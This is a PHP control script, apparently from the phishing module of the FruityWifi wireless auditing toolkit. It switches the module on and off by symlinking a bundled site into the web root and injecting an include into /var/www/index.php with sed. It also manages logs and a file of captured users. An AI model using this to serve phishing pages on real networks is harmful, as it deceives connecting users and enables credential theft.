<?
include_once dirname(__FILE__)."/../../../config/config.php";
include_once dirname(__FILE__)."/../_info_.php";

require_once WWWPATH."/includes/login_check.php";
require_once WWWPATH."/includes/filter_getpost.php";
include_once WWWPATH."/includes/functions.php";

if(isset($_GET['service']) and $_GET['service'] == $mod_name and isset($_GET['action'])) {

    if ($_GET['action'] == "start") {

        // Create log directory
        if(!is_dir($mod_logs_history)) {
            exec_fruitywifi(BIN_MKDIR." -p $mod_logs_history");
            exec_fruitywifi(BIN_CHOWN." fruitywifi:fruitywifi $mod_logs_history");
        }

        // COPY LOG
        if (file_exists($mod_logs) and 0 < filesize($mod_logs)) {
            exec_fruitywifi(BIN_CP." $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log");
            exec_fruitywifi(BIN_ECHO." -n > $mod_logs");
        }

        exec_fruitywifi("ln -s $mod_path/includes/www.site /var/www/site");

        if (!file_exists("/var/www/index.php")) {
            exec_fruitywifi(BIN_ECHO." '.' >> /var/www/index.php");
        }

        exec_fruitywifi(BIN_SED." -i 1i'<? include \\\"site\/index.php\\\"; \/\* FruityWifi-Phishing \*\/ ?>' /var/www/index.php");

    } elseif ($_GET['action'] == "stop") {

	    // STOP MODULE
        exec_fruitywifi(BIN_SED." -i '/FruityWifi-Phishing/d' /var/www/index.php");

        //exec_fruitywifi("rm /var/www/site");
        unlink("/var/www/site");

        // COPY LOG
        if (file_exists($mod_logs) and 0 < filesize($mod_logs)) {
            exec_fruitywifi(BIN_CP." $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log");
            exec_fruitywifi(BIN_ECHO." -n > $mod_logs");
        }

    }

}

$filename = $file_users;

if (isset($_GET['service']) and $_GET['service'] == "users" and isset($_GET['id_data']) and is_numeric($_GET['id_data'])) {
	$id_data = trim($_GET['id_data']);

	if ($_GET['action'] == "delete") {
        exec_fruitywifi(BIN_SED." -i '".$id_data."d' $filename");
        // ADD TO LOGS
        exec_fruitywifi(BIN_ECHO." 'DELETE: $id_data|".date("Y-m-d h:i:s")."' >> $mod_logs ");
	}

    header('Location: ../index.php?tab=1');
    exit;
}


if (isset($_GET['page']) and $_GET['page'] == "status") {
    header('Location: '.WEBPATH.'/action.php');
} else {
    header('Location: '.WEBPATH.'/modules/action.php?page='.$mod_name);
}
?>